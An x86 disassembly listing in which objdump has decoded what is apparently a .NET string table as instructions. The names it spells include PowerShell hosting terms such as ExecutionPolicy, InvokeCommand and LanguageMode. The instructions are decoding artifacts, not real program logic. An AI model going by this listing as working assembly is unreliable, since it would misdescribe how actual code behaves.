  40696f:	js     0x4069da
  406971:	jae    0x4069e7
  406973:	imul   ebp,DWORD PTR [esi+0x67],0x76726553
  40697a:	imul   esp,DWORD PTR [ebx+0x65],0x72615400
  406981:	addr16 gs je 0x4069c7
  406985:	popa   
  406986:	jae    0x4069ed
  406988:	add    BYTE PTR [ebx+0x74],dl
  40698b:	popa   
  40698c:	jb     0x406a02
  40698e:	inc    ebx
  40698f:	outs   dx,DWORD PTR ds:[esi]
  406990:	ins    BYTE PTR es:[edi],dx
  406991:	ins    BYTE PTR es:[edi],dx
  406992:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406997:	outs   dx,BYTE PTR ds:[esi]
  406998:	inc    esi
  406999:	outs   dx,DWORD PTR ds:[esi]
  40699a:	jb     0x4069f0
  40699c:	popa   
  40699d:	jb     0x406a06
  40699f:	gs je  0x4069a2
  4069a2:	dec    ebp
  4069a3:	popa   
  4069a4:	outs   dx,BYTE PTR ds:[esi]
  4069a5:	popa   
  4069a6:	addr16 gs fs inc ecx
  4069aa:	jae    0x406a1f
  4069ac:	gs ins DWORD PTR es:[edi],dx
  4069ae:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  4069b2:	jns    0x406a24
  4069b4:	add    BYTE PTR gs:[edi+0x65],al
  4069b8:	je     0x406a0e
  4069ba:	popa   
  4069bb:	jb     0x406a24
  4069bd:	gs je  0x406a0d
  4069c0:	popa   
  4069c1:	outs   dx,BYTE PTR ds:[esi]
  4069c2:	popa   
  4069c3:	addr16 gs fs push esp
  4069c7:	jns    0x406a39
  4069c9:	add    BYTE PTR gs:[ebx+eax*2],bh
  4069cd:	ins    BYTE PTR es:[edi],dx
  4069ce:	imul   esp,DWORD PTR [ebp+0x6e],0x5f6b3e74
  4069d5:	pop    edi
  4069d6:	inc    edx
  4069d7:	popa   
  4069d8:	arpl   WORD PTR [ebx+0x69],bp
  4069db:	outs   dx,BYTE PTR ds:[esi]
  4069dc:	addr16 inc esi
  4069de:	imul   esp,DWORD PTR [ebp+0x6c],0x6c430064
  4069e5:	imul   esp,DWORD PTR [ebp+0x6e],0x79530074
  4069ec:	jae    0x406a62
  4069ee:	gs ins DWORD PTR es:[edi],dx
  4069f0:	cs push edx
  4069f2:	gs jae 0x406a64
  4069f5:	jne    0x406a69
  4069f7:	arpl   WORD PTR [ebp+0x73],sp
  4069fa:	add    BYTE PTR [edx+0x65],dl
  4069fd:	jae    0x406a6e
  4069ff:	jne    0x406a73
  406a01:	arpl   WORD PTR [ebp+0x4d],sp
  406a04:	popa   
  406a05:	outs   dx,BYTE PTR ds:[esi]
  406a06:	popa   
  406a07:	addr16 gs jb 0x406a0b
  406a0b:	jb     0x406a72
  406a0d:	jae    0x406a7e
  406a0f:	jne    0x406a83
  406a11:	arpl   WORD PTR [ebp+0x4d],sp
  406a14:	popa   
  406a15:	outs   dx,BYTE PTR ds:[esi]
  406a16:	add    BYTE PTR [ebx+0x79],dl
  406a19:	jae    0x406a8f
  406a1b:	gs ins DWORD PTR es:[edi],dx
  406a1d:	cs inc edi
  406a1f:	ins    BYTE PTR es:[edi],dx
  406a20:	outs   dx,DWORD PTR ds:[esi]
  406a21:	bound  esp,QWORD PTR [ecx+0x6c]
  406a24:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  406a2b:	add    BYTE PTR [ebx+0x75],al
  406a2e:	ins    BYTE PTR es:[edi],dx
  406a2f:	je     0x406aa6
  406a31:	jb     0x406a98
  406a33:	dec    ecx
  406a34:	outs   dx,BYTE PTR ds:[esi]
  406a35:	outs   dx,WORD PTR ds:[esi]
  406a37:	add    BYTE PTR [edx+0x65],dh
  406a3a:	jae    0x406aab
  406a3c:	jne    0x406ab0
  406a3e:	arpl   WORD PTR [ebp+0x43],sp
  406a41:	jne    0x406aaf
  406a43:	je     0x406aba
  406a45:	jb     0x406aac
  406a47:	add    BYTE PTR [edi+0x65],ah
  406a4a:	je     0x406aab
  406a4c:	push   edx
  406a4d:	gs jae 0x406abf
  406a50:	jne    0x406ac4
  406a52:	arpl   WORD PTR [ebp+0x4d],sp
  406a55:	popa   
  406a56:	outs   dx,BYTE PTR ds:[esi]
  406a57:	popa   
  406a58:	addr16 gs jb 0x406a5c
  406a5c:	addr16 gs je 0x406abf
  406a60:	inc    ebx
  406a61:	jne    0x406acf
  406a63:	je     0x406ada
  406a65:	jb     0x406acc
  406a67:	add    BYTE PTR [ebx+0x65],dh
  406a6a:	je     0x406acb
  406a6c:	inc    ebx
  406a6d:	jne    0x406adb
  406a6f:	je     0x406ae6
  406a71:	jb     0x406ad8
  406a73:	add    BYTE PTR [edi+0x65],ah
  406a76:	je     0x406ad7
  406a78:	inc    ecx
  406a79:	outs   dx,BYTE PTR ds:[esi]
  406a7a:	popa   
  406a7b:	ins    BYTE PTR es:[edi],dx
  406a7c:	jns    0x406af8
  406a7e:	gs inc ebx
  406a80:	popa   
  406a81:	outs   dx,BYTE PTR ds:[esi]
  406a82:	je     0x406aca
  406a84:	imul   ebp,DWORD PTR [esi+0x64],0x63657053
  406a8b:	imul   esp,DWORD PTR [esi+0x69],0x72506465
  406a92:	outs   dx,DWORD PTR ds:[esi]
  406a93:	arpl   WORD PTR [ebp+0x73],sp
  406a96:	jae    0x406a98
  406a98:	addr16 gs je 0x406afb
  406a9c:	inc    ecx
  406a9d:	outs   dx,BYTE PTR ds:[esi]
  406a9e:	popa   
  406a9f:	ins    BYTE PTR es:[edi],dx
  406aa0:	jns    0x406b1c
  406aa2:	gs inc ebx
  406aa4:	outs   dx,DWORD PTR ds:[esi]
  406aa5:	ins    DWORD PTR es:[edi],dx
  406aa6:	jo     0x406b14
  406aa8:	gs je  0x406b10
  406aab:	add    BYTE PTR [edi+0x65],ah
  406aae:	je     0x406b0f
  406ab0:	inc    ecx
  406ab1:	outs   dx,BYTE PTR ds:[esi]
  406ab2:	popa   
  406ab3:	ins    BYTE PTR es:[edi],dx
  406ab4:	jns    0x406b30
  406ab6:	gs inc ebp
  406ab8:	jb     0x406b2c
  406aba:	outs   dx,DWORD PTR ds:[esi]
  406abb:	jb     0x406b03
  406abd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x44],0x6e73656f
  406ac5:	je     0x406b0c
  406ac7:	js     0x406b32
  406ac9:	jae    0x406b3f
  406acb:	add    BYTE PTR [edi+0x65],ah
  406ace:	je     0x406b2f
  406ad0:	inc    ecx
  406ad1:	outs   dx,BYTE PTR ds:[esi]
  406ad2:	popa   
  406ad3:	ins    BYTE PTR es:[edi],dx
  406ad4:	jns    0x406b50
  406ad6:	gs inc ebp
  406ad8:	jb     0x406b4c
  406ada:	outs   dx,DWORD PTR ds:[esi]
  406adb:	jb     0x406b2f
  406add:	gs jno 0x406b55
  406ae0:	imul   esi,DWORD PTR [edx+0x65],0x6e695373
  406ae7:	ins    BYTE PTR es:[di],dx
  406ae9:	gs push eax
  406aeb:	imul   esp,DWORD PTR [eax+eax*1+0x67],0x415f7465
  406af3:	outs   dx,BYTE PTR ds:[esi]
  406af4:	popa   
  406af5:	ins    BYTE PTR es:[edi],dx
  406af6:	jns    0x406b72
  406af8:	gs inc ebp
  406afa:	jb     0x406b6e
  406afc:	outs   dx,DWORD PTR ds:[esi]
  406afd:	jb     0x406b53
  406aff:	jb     0x406b62
  406b01:	arpl   WORD PTR [ebp+0x49],sp
  406b04:	outs   dx,BYTE PTR ds:[esi]
  406b05:	jbe    0x406b68
  406b07:	ins    BYTE PTR es:[edi],dx
  406b08:	imul   esp,DWORD PTR [eax+eax*1+0x67],0x415f7465
  406b10:	outs   dx,BYTE PTR ds:[esi]
  406b11:	popa   
  406b12:	ins    BYTE PTR es:[edi],dx
  406b13:	jns    0x406b8f
  406b15:	gs push eax
  406b17:	jb     0x406b88
  406b19:	arpl   WORD PTR [ebp+0x73],sp
  406b1c:	jae    0x406b5f
  406b1e:	jb     0x406b87
  406b20:	dec    esi
  406b21:	outs   dx,DWORD PTR ds:[esi]
  406b22:	je     0x406b77
  406b24:	jne    0x406b96
  406b26:	jo     0x406b97
  406b28:	jb     0x406b9e
  406b2a:	gs fs inc esi
  406b2d:	outs   dx,DWORD PTR ds:[esi]
  406b2e:	jb     0x406b84
  406b30:	jb     0x406b93
  406b32:	arpl   WORD PTR [ebp+0x0],sp
  406b35:	addr16 gs je 0x406b98
  406b39:	inc    ecx
  406b3a:	outs   dx,BYTE PTR ds:[esi]
  406b3b:	popa   
  406b3c:	ins    BYTE PTR es:[edi],dx
  406b3d:	jns    0x406bb9
  406b3f:	gs push ebx
  406b41:	jo     0x406ba8
  406b43:	arpl   WORD PTR [ecx+0x66],bp
  406b46:	imul   esp,DWORD PTR [ebp+0x64],0x636f7250
  406b4d:	gs jae 0x406bc3
  406b50:	dec    ecx
  406b51:	jae    0x406b94
  406b53:	ins    DWORD PTR es:[edi],dx
  406b54:	bound  ebp,QWORD PTR [ecx+0x67]
  406b57:	jne    0x406bc8
  406b59:	jne    0x406bce
  406b5b:	add    BYTE PTR [edi+0x65],ah
  406b5e:	je     0x406bbf
  406b60:	inc    ecx
  406b61:	outs   dx,BYTE PTR ds:[esi]
  406b62:	popa   
  406b63:	ins    BYTE PTR es:[edi],dx
  406b64:	jns    0x406be0
  406b66:	gs push ebx
  406b68:	je     0x406bcb
  406b6a:	jb     0x406be0
  406b6c:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  406b73:	pop    edi
  406b74:	inc    ecx
  406b75:	outs   dx,BYTE PTR ds:[esi]
  406b76:	popa   
  406b77:	ins    BYTE PTR es:[edi],dx
  406b78:	jns    0x406bf4
  406b7a:	gs push edi
  406b7c:	popa   
  406b7d:	jb     0x406bed
  406b7f:	push   edi
  406b80:	outs   dx,DWORD PTR ds:[esi]
  406b81:	outs   dx,BYTE PTR ds:[esi]
  406b82:	je     0x406bd6
  406b84:	gs ins DWORD PTR es:[edi],dx
  406b86:	outs   dx,DWORD PTR ds:[esi]
  406b87:	jbe    0x406bee
  406b89:	inc    ebp
  406b8a:	je     0x406bf8
  406b8c:	jae    0x406b8e
  406b8e:	addr16 gs je 0x406bf1
  406b92:	inc    ecx
  406b93:	jo     0x406c05
  406b95:	dec    eax
  406b96:	gs popa 
  406b98:	fs gs jb 0x406bf0
  406b9c:	gs js  0x406c13
  406b9f:	add    BYTE PTR [edi+0x65],ah
  406ba2:	je     0x406c03
  406ba4:	inc    ecx
  406ba5:	je     0x406c1b
  406ba7:	popa   
  406ba8:	arpl   WORD PTR [eax+0x4f],bp
  406bab:	jne    0x406c21
  406bad:	jo     0x406c24
  406baf:	je     0x406bf4
  406bb1:	popa   
  406bb2:	outs   dx,BYTE PTR ds:[esi]
  406bb3:	je     0x406bf6
  406bb5:	je     0x406c2b
  406bb7:	popa   
  406bb8:	arpl   WORD PTR [eax+0x0],bp
  406bbb:	addr16 gs je 0x406c1e
  406bbf:	inc    ecx
  406bc0:	je     0x406c36
  406bc2:	popa   
  406bc3:	arpl   WORD PTR [eax+0x4f],bp
  406bc6:	jne    0x406c3c
  406bc8:	jo     0x406c3f
  406bca:	je     0x406c1f
  406bcc:	je     0x406c2f
  406bce:	jb     0x406c44
  406bd0:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  406bd7:	pop    edi
  406bd8:	inc    ebx
  406bd9:	outs   dx,DWORD PTR ds:[esi]
  406bda:	ins    BYTE PTR es:[edi],dx
  406bdb:	ins    BYTE PTR es:[edi],dx
  406bdc:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406be1:	outs   dx,BYTE PTR ds:[esi]
  406be2:	push   ebx
  406be3:	je     0x406c46
  406be5:	jb     0x406c5b
  406be7:	gs fs dec ebp
  406bea:	gs jae 0x406c60
  406bed:	popa   
  406bee:	add    BYTE PTR gs:[bx+0x65],ah
  406bf3:	je     0x406c54
  406bf5:	inc    ebx
  406bf6:	outs   dx,DWORD PTR ds:[esi]
  406bf7:	ins    DWORD PTR es:[edi],dx
  406bf8:	ins    DWORD PTR es:[edi],dx
  406bf9:	popa   
  406bfa:	outs   dx,BYTE PTR ds:[esi]
  406bfb:	fs inc ecx
  406bfd:	outs   dx,BYTE PTR ds:[esi]
  406bfe:	popa   
  406bff:	ins    BYTE PTR es:[edi],dx
  406c00:	jns    0x406c7c
  406c02:	add    BYTE PTR gs:[edi+0x65],ah
  406c06:	je     0x406c67
  406c08:	inc    ebx
  406c09:	outs   dx,DWORD PTR ds:[esi]
  406c0a:	ins    DWORD PTR es:[edi],dx
  406c0b:	ins    DWORD PTR es:[edi],dx
  406c0c:	popa   
  406c0d:	outs   dx,BYTE PTR ds:[esi]
  406c0e:	fs inc ecx
  406c10:	je     0x406c86
  406c12:	popa   
  406c13:	arpl   WORD PTR [eax+0x0],bp
  406c16:	addr16 gs je 0x406c79
  406c1a:	inc    ebx
  406c1b:	outs   dx,DWORD PTR ds:[esi]
  406c1c:	ins    DWORD PTR es:[edi],dx
  406c1d:	ins    DWORD PTR es:[edi],dx
  406c1e:	popa   
  406c1f:	outs   dx,BYTE PTR ds:[esi]
  406c20:	fs inc ebx
  406c22:	outs   dx,DWORD PTR ds:[esi]
  406c23:	outs   dx,BYTE PTR ds:[esi]
  406c24:	imul   sp,WORD PTR [edi+0x0],0x6567
  406c2a:	je     0x406c8b
  406c2c:	inc    ebx
  406c2d:	outs   dx,DWORD PTR ds:[esi]
  406c2e:	ins    DWORD PTR es:[edi],dx
  406c2f:	ins    DWORD PTR es:[edi],dx
  406c30:	popa   
  406c31:	outs   dx,BYTE PTR ds:[esi]
  406c32:	fs inc esp
  406c34:	gs je  0x406c98
  406c37:	arpl   WORD PTR [eax+0x0],bp
  406c3a:	addr16 gs je 0x406c9d
  406c3e:	inc    ebx
  406c3f:	outs   dx,DWORD PTR ds:[esi]
  406c40:	ins    DWORD PTR es:[edi],dx
  406c41:	ins    DWORD PTR es:[edi],dx
  406c42:	popa   
  406c43:	outs   dx,BYTE PTR ds:[esi]
  406c44:	fs dec esp
  406c46:	popa   
  406c47:	jne    0x406cb7
  406c49:	arpl   WORD PTR [eax+0x0],bp
  406c4c:	addr16 gs je 0x406caf
  406c50:	inc    ebx
  406c51:	outs   dx,DWORD PTR ds:[esi]
  406c52:	ins    DWORD PTR es:[edi],dx
  406c53:	ins    DWORD PTR es:[edi],dx
  406c54:	popa   
  406c55:	outs   dx,BYTE PTR ds:[esi]
  406c56:	fs dec esp
  406c58:	popa   
  406c59:	jne    0x406cc9
  406c5b:	arpl   WORD PTR [eax+0x41],bp
  406c5e:	jb     0x406cc7
  406c60:	jae    0x406c62
  406c62:	addr16 gs je 0x406cc5
  406c66:	inc    ebx
  406c67:	outs   dx,DWORD PTR ds:[esi]
  406c68:	ins    DWORD PTR es:[edi],dx
  406c69:	ins    DWORD PTR es:[edi],dx
  406c6a:	popa   
  406c6b:	outs   dx,BYTE PTR ds:[esi]
  406c6c:	fs dec edi
  406c6e:	jne    0x406ce4
  406c70:	inc    esp
  406c71:	imul   esi,DWORD PTR [edx+0x0],0x5f746567
  406c78:	inc    ebx
  406c79:	outs   dx,DWORD PTR ds:[esi]
  406c7a:	ins    DWORD PTR es:[edi],dx
  406c7b:	ins    DWORD PTR es:[edi],dx
  406c7c:	popa   
  406c7d:	outs   dx,BYTE PTR ds:[esi]
  406c7e:	fs push eax
  406c80:	jb     0x406cf1
  406c82:	arpl   WORD PTR [ebp+0x73],sp
  406c85:	jae    0x406c87
  406c87:	addr16 gs je 0x406cea
  406c8b:	inc    ebx
  406c8c:	outs   dx,DWORD PTR ds:[esi]
  406c8d:	ins    DWORD PTR es:[edi],dx
  406c8e:	ins    DWORD PTR es:[edi],dx
  406c8f:	popa   
  406c90:	outs   dx,BYTE PTR ds:[esi]
  406c91:	fs push ecx
  406c93:	jne    0x406cfa
  406c95:	jb     0x406d10
  406c97:	add    BYTE PTR [edi+0x65],ah
  406c9a:	je     0x406cfb
  406c9c:	inc    esp
  406c9d:	gs je  0x406d01
  406ca0:	arpl   WORD PTR [eax+0x4f],bp
  406ca3:	jne    0x406d19
  406ca5:	jo     0x406d1c
  406ca7:	je     0x406cef
  406ca9:	popa   
  406caa:	imul   ebp,DWORD PTR [esi+ecx*2+0x6f],0x6c6f4374
  406cb2:	ins    BYTE PTR es:[edi],dx
  406cb3:	arpl   WORD PTR gs:[ecx+ebp*2+0x6e],si
  406cb8:	add    BYTE PTR [bx+0x65],ah
  406cbc:	je     0x406d1d
  406cbe:	inc    esp
  406cbf:	gs je  0x406d23
  406cc2:	arpl   WORD PTR [eax+0x4f],bp
  406cc5:	jne    0x406d3b
  406cc7:	jo     0x406d3e
  406cc9:	je     0x406d1e
  406ccb:	je     0x406d3c
  406ccd:	jo     0x406d15
  406ccf:	popa   
  406cd0:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x74656700
  406cd8:	pop    edi
  406cd9:	inc    esp
  406cda:	gs je  0x406d3e
  406cdd:	arpl   WORD PTR [eax+0x4f],bp
  406ce0:	jne    0x406d56
  406ce2:	jo     0x406d59
  406ce4:	je     0x406d39
  406ce6:	je     0x406d57
  406ce8:	jo     0x406d5a
  406cea:	gs add BYTE PTR fs:[edi+0x65],ah
  406cef:	je     0x406d50
  406cf1:	inc    esp
  406cf2:	gs je  0x406d56
  406cf5:	arpl   WORD PTR [eax+0x4f],bp
  406cf8:	jne    0x406d6e
  406cfa:	jo     0x406d71
  406cfc:	je     0x406d51
  406cfe:	je     0x406d6f
  406d00:	jo     0x406d72
  406d02:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  406d09:	pop    edi
  406d0a:	inc    esi
  406d0b:	popa   
  406d0c:	je     0x406d6f
  406d0e:	ins    BYTE PTR es:[edi],dx
  406d0f:	inc    ebp
  406d10:	jb     0x406d84
  406d12:	outs   dx,DWORD PTR ds:[esi]
  406d13:	jb     0x406d15
  406d15:	addr16 gs je 0x406d78
  406d19:	dec    ecx
  406d1a:	outs   dx,BYTE PTR ds:[esi]
  406d1b:	jbe    0x406d7e
  406d1d:	ins    BYTE PTR es:[edi],dx
  406d1e:	imul   esp,DWORD PTR [ebx+eax*2+0x6f],0x6e69626d
  406d26:	popa   
  406d27:	je     0x406d92
  406d29:	outs   dx,DWORD PTR ds:[esi]
  406d2a:	outs   dx,BYTE PTR ds:[esi]
  406d2b:	inc    ebx
  406d2c:	outs   dx,DWORD PTR ds:[esi]
  406d2d:	ins    DWORD PTR es:[edi],dx
  406d2e:	ins    DWORD PTR es:[edi],dx
  406d2f:	popa   
  406d30:	outs   dx,BYTE PTR ds:[esi]
  406d31:	fs push eax
  406d33:	popa   
  406d34:	jb     0x406d97
  406d36:	ins    DWORD PTR es:[edi],dx
  406d37:	jae    0x406d39
  406d39:	addr16 gs je 0x406d9c
  406d3d:	dec    ecx
  406d3e:	outs   dx,BYTE PTR ds:[esi]
  406d3f:	jbe    0x406da2
  406d41:	ins    BYTE PTR es:[edi],dx
  406d42:	imul   esp,DWORD PTR [ebx+eax*2+0x6f],0x6e616d6d
  406d4a:	fs dec esp
  406d4c:	imul   ebp,DWORD PTR [esi+0x65],0x74656700
  406d53:	pop    edi
  406d54:	dec    ecx
  406d55:	outs   dx,BYTE PTR ds:[esi]
  406d56:	jbe    0x406db9
  406d58:	ins    BYTE PTR es:[edi],dx
  406d59:	imul   esp,DWORD PTR [esi+ecx*2+0x6f],0x6d6d6f43
  406d61:	popa   
  406d62:	outs   dx,BYTE PTR ds:[esi]
  406d63:	fs push eax
  406d65:	popa   
  406d66:	jb     0x406dc9
  406d68:	ins    DWORD PTR es:[edi],dx
  406d69:	jae    0x406d6b
  406d6b:	addr16 gs je 0x406dce
  406d6f:	dec    ecx
  406d70:	outs   dx,BYTE PTR ds:[esi]
  406d71:	jbe    0x406dd4
  406d73:	ins    BYTE PTR es:[edi],dx
  406d74:	imul   esp,DWORD PTR [ebp+edx*2+0x73],0x75614c65
  406d7c:	outs   dx,BYTE PTR ds:[esi]
  406d7d:	arpl   WORD PTR [eax+0x41],bp
  406d80:	jb     0x406de9
  406d82:	jae    0x406d84
  406d84:	addr16 gs je 0x406de7
  406d88:	dec    ecx
  406d89:	outs   dx,BYTE PTR ds:[esi]
  406d8a:	jbe    0x406ded
  406d8c:	ins    BYTE PTR es:[edi],dx
  406d8d:	imul   esp,DWORD PTR [ebp+edx*2+0x73],0x6f725065
  406d95:	arpl   WORD PTR [ebp+0x73],sp
  406d98:	jae    0x406ddb
  406d9a:	jb     0x406e03
  406d9c:	add    BYTE PTR [edi+0x65],ah
  406d9f:	je     0x406e00
  406da1:	dec    esp
  406da2:	popa   
  406da3:	jne    0x406e13
  406da5:	arpl   WORD PTR [eax+0x4f],bp
  406da8:	jne    0x406e1e
  406daa:	jo     0x406e21
  406dac:	je     0x406df4
  406dae:	popa   
  406daf:	imul   ebp,DWORD PTR [ebx+eax*2+0x61],0x7453746e
  406db7:	popa   
  406db8:	jb     0x406e2e
  406dba:	add    BYTE PTR [edi+0x65],ah
  406dbd:	je     0x406e1e
  406dbf:	dec    esp
  406dc0:	popa   
  406dc1:	jne    0x406e31
  406dc3:	arpl   WORD PTR [eax+0x4f],bp
  406dc6:	jne    0x406e3c
  406dc8:	jo     0x406e3f
  406dca:	je     0x406e1f
  406dcc:	je     0x406e2f
  406dce:	jb     0x406e44
  406dd0:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  406dd7:	pop    edi
  406dd8:	dec    edi
  406dd9:	jne    0x406e4f
  406ddb:	jo     0x406e52
  406ddd:	je     0x406e24
  406ddf:	jb     0x406e53
  406de1:	outs   dx,DWORD PTR ds:[esi]
  406de2:	jb     0x406e39
  406de4:	outs   dx,BYTE PTR ds:[esi]
  406de5:	popa   
  406de6:	jne    0x406e5c
  406de8:	push   0x7a69726f
  406ded:	gs add BYTE PTR fs:[edi+0x65],ah
  406df2:	je     0x406e53
  406df4:	push   eax
  406df5:	popa   
  406df6:	jb     0x406e59
  406df8:	ins    DWORD PTR es:[edi],dx
  406df9:	inc    esp
  406dfa:	gs jae 0x406e60
  406dfd:	jb     0x406e68
  406dff:	jo     0x406e75
  406e01:	imul   ebp,DWORD PTR [edi+0x6e],0x6c616e41
  406e08:	jns    0x406e84
  406e0a:	add    BYTE PTR gs:[edi+0x65],ah
  406e0e:	je     0x406e6f
  406e10:	push   eax
  406e11:	popa   
  406e12:	jb     0x406e75
  406e14:	ins    DWORD PTR es:[edi],dx
  406e15:	inc    esp
  406e16:	gs jae 0x406e7c
  406e19:	jb     0x406e84
  406e1b:	jo     0x406e91
  406e1d:	imul   ebp,DWORD PTR [edi+0x6e],0x61747441
  406e24:	arpl   WORD PTR [eax+0x0],bp
  406e27:	addr16 gs je 0x406e8a
  406e2b:	push   eax
  406e2c:	popa   
  406e2d:	jb     0x406e90
  406e2f:	ins    DWORD PTR es:[edi],dx
  406e30:	inc    esp
  406e31:	gs jae 0x406e97
  406e34:	jb     0x406e9f
  406e36:	jo     0x406eac
  406e38:	imul   ebp,DWORD PTR [edi+0x6e],0x666e6f43
  406e3f:	imul   esp,DWORD PTR [edi+0x0],0x5f746567
  406e46:	push   eax
  406e47:	popa   
  406e48:	jb     0x406eab
  406e4a:	ins    DWORD PTR es:[edi],dx
  406e4b:	inc    esp
  406e4c:	gs jae 0x406eb2
  406e4f:	jb     0x406eba
  406e51:	jo     0x406ec7
  406e53:	imul   ebp,DWORD PTR [edi+0x6e],0x61746544
  406e5a:	arpl   WORD PTR [eax+0x0],bp
  406e5d:	addr16 gs je 0x406ec0
  406e61:	push   eax
  406e62:	popa   
  406e63:	jb     0x406ec6
  406e65:	ins    DWORD PTR es:[edi],dx
  406e66:	inc    esp
  406e67:	gs jae 0x406ecd
  406e6a:	jb     0x406ed5
  406e6c:	jo     0x406ee2
  406e6e:	imul   ebp,DWORD PTR [edi+0x6e],0x6e75614c
  406e75:	arpl   WORD PTR [eax+0x0],bp
  406e78:	addr16 gs je 0x406edb
  406e7c:	push   eax
  406e7d:	popa   
  406e7e:	jb     0x406ee1
  406e80:	ins    DWORD PTR es:[edi],dx
  406e81:	inc    esp
  406e82:	gs jae 0x406ee8
  406e85:	jb     0x406ef0
  406e87:	jo     0x406efd
  406e89:	imul   ebp,DWORD PTR [edi+0x6e],0x6e75614c
  406e90:	arpl   WORD PTR [eax+0x41],bp
  406e93:	jb     0x406efc
  406e95:	jae    0x406e97
  406e97:	addr16 gs je 0x406efa
  406e9b:	push   eax
  406e9c:	popa   
  406e9d:	jb     0x406f00
  406e9f:	ins    DWORD PTR es:[edi],dx
  406ea0:	inc    esp
  406ea1:	gs jae 0x406f07
  406ea4:	jb     0x406f0f
  406ea6:	jo     0x406f1c
  406ea8:	imul   ebp,DWORD PTR [edi+0x6e],0x7074754f
  406eaf:	jne    0x406f25
  406eb1:	add    BYTE PTR [edi+0x65],ah
  406eb4:	je     0x406f15
  406eb6:	push   eax
  406eb7:	popa   
  406eb8:	jb     0x406f1b
  406eba:	ins    DWORD PTR es:[edi],dx
  406ebb:	inc    esp
  406ebc:	gs jae 0x406f22
  406ebf:	jb     0x406f2a
  406ec1:	jo     0x406f37
  406ec3:	imul   ebp,DWORD PTR [edi+0x6e],0x636f7250
  406eca:	gs jae 0x406f40
  406ecd:	add    BYTE PTR [edi+0x65],ah
  406ed0:	je     0x406f31
  406ed2:	push   eax
  406ed3:	popa   
  406ed4:	jb     0x406f37
  406ed6:	ins    DWORD PTR es:[edi],dx
  406ed7:	inc    esp
  406ed8:	gs jae 0x406f3e
  406edb:	jb     0x406f46
  406edd:	jo     0x406f53
  406edf:	imul   ebp,DWORD PTR [edi+0x6e],0x72657551
  406ee6:	jns    0x406ee8
  406ee8:	addr16 gs je 0x406f4b
  406eec:	push   eax
  406eed:	popa   
  406eee:	jb     0x406f51
  406ef0:	ins    DWORD PTR es:[edi],dx
  406ef1:	dec    eax
  406ef2:	gs ins BYTE PTR es:[edi],dx
  406ef4:	jo     0x406f4c
  406ef6:	popa   
  406ef7:	ins    BYTE PTR es:[edi],dx
  406ef8:	jne    0x406f5f
  406efa:	inc    ecx
  406efb:	outs   dx,BYTE PTR ds:[esi]
  406efc:	popa   
  406efd:	ins    BYTE PTR es:[edi],dx
  406efe:	jns    0x406f7a
  406f00:	add    BYTE PTR gs:[edi+0x65],ah
  406f04:	je     0x406f65
  406f06:	push   eax
  406f07:	popa   
  406f08:	jb     0x406f6b
  406f0a:	ins    DWORD PTR es:[edi],dx
  406f0b:	dec    eax
  406f0c:	gs ins BYTE PTR es:[edi],dx
  406f0e:	jo     0x406f66
  406f10:	popa   
  406f11:	ins    BYTE PTR es:[edi],dx
  406f12:	jne    0x406f79
  406f14:	inc    ebx
  406f15:	outs   dx,DWORD PTR ds:[esi]
  406f16:	outs   dx,BYTE PTR ds:[esi]
  406f17:	imul   sp,WORD PTR [edi+0x0],0x6567
  406f1d:	je     0x406f7e
  406f1f:	push   eax
  406f20:	popa   
  406f21:	jb     0x406f84
  406f23:	ins    DWORD PTR es:[edi],dx
  406f24:	dec    eax
  406f25:	gs ins BYTE PTR es:[edi],dx
  406f27:	jo     0x406f7f
  406f29:	popa   
  406f2a:	ins    BYTE PTR es:[edi],dx
  406f2b:	jne    0x406f92
  406f2d:	dec    esp
  406f2e:	popa   
  406f2f:	jne    0x406f9f
  406f31:	arpl   WORD PTR [eax+0x0],bp
  406f34:	addr16 gs je 0x406f97
  406f38:	push   eax
  406f39:	popa   
  406f3a:	jb     0x406f9d
  406f3c:	ins    DWORD PTR es:[edi],dx
  406f3d:	dec    eax
  406f3e:	gs ins BYTE PTR es:[edi],dx
  406f40:	jo     0x406f98
  406f42:	popa   
  406f43:	ins    BYTE PTR es:[edi],dx
  406f44:	jne    0x406fab
  406f46:	dec    esp
  406f47:	popa   
  406f48:	jne    0x406fb8
  406f4a:	arpl   WORD PTR [eax+0x41],bp
  406f4d:	jb     0x406fb6
  406f4f:	jae    0x406f51
  406f51:	addr16 gs je 0x406fb4
  406f55:	push   eax
  406f56:	popa   
  406f57:	jb     0x406fba
  406f59:	ins    DWORD PTR es:[edi],dx
  406f5a:	dec    eax
  406f5b:	gs ins BYTE PTR es:[edi],dx
  406f5d:	jo     0x406fb5
  406f5f:	popa   
  406f60:	ins    BYTE PTR es:[edi],dx
  406f61:	jne    0x406fc8
  406f63:	dec    edi
  406f64:	jne    0x406fda
  406f66:	jo     0x406fdd
  406f68:	je     0x406f6a
  406f6a:	addr16 gs je 0x406fcd
  406f6e:	push   eax
  406f6f:	popa   
  406f70:	jb     0x406fd3
  406f72:	ins    DWORD PTR es:[edi],dx
  406f73:	dec    eax
  406f74:	gs ins BYTE PTR es:[edi],dx
  406f76:	jo     0x406fce
  406f78:	popa   
  406f79:	ins    BYTE PTR es:[edi],dx
  406f7a:	jne    0x406fe1
  406f7c:	push   eax
  406f7d:	jb     0x406fee
  406f7f:	arpl   WORD PTR [ebp+0x73],sp
  406f82:	jae    0x406f84
  406f84:	addr16 gs je 0x406fe7
  406f88:	push   ecx
  406f89:	jne    0x406ff0
  406f8b:	jb     0x407006
  406f8d:	dec    edi
  406f8e:	jne    0x407004
  406f90:	jo     0x407007
  406f92:	je     0x406fd7
  406f94:	outs   dx,DWORD PTR ds:[esi]
  406f95:	ins    BYTE PTR es:[edi],dx
  406f96:	ins    BYTE PTR es:[edi],dx
  406f97:	arpl   WORD PTR gs:[ecx+ebp*2+0x6e],si
  406f9c:	add    BYTE PTR [bx+0x65],ah
  406fa0:	je     0x407001
  406fa2:	push   ecx
  406fa3:	jne    0x40700a
  406fa5:	jb     0x407020
  406fa7:	dec    edi
  406fa8:	jne    0x40701e
  406faa:	jo     0x407021
  406fac:	je     0x406ff3
  406fae:	jb     0x407022
  406fb0:	outs   dx,DWORD PTR ds:[esi]
